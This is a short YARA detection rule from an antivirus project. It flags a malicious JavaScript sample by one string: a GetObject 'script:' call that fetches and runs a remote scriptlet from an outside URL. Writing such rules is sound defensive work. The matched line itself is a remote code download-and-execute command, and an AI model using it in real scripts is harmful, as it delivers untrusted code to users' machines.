rule sig_80d85529c1bc38890ea9a2ea4f1ae17a3c9189ba3112000636150267172b {
  meta:
    description = "datamaliciousorder - file 80d85529c1bc38890ea9a2ea4f1ae17a3c9189ba3112000636150267172b0ed8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80d85529c1bc38890ea9a2ea4f1ae17a3c9189ba3112000636150267172b0ed8"

  strings:
    $s1 = "GetObject(\"script:http://zx.pe/bp.php\");" fullword ascii

  condition:
    uint16(0) == 0x2f0a and
    all of them
}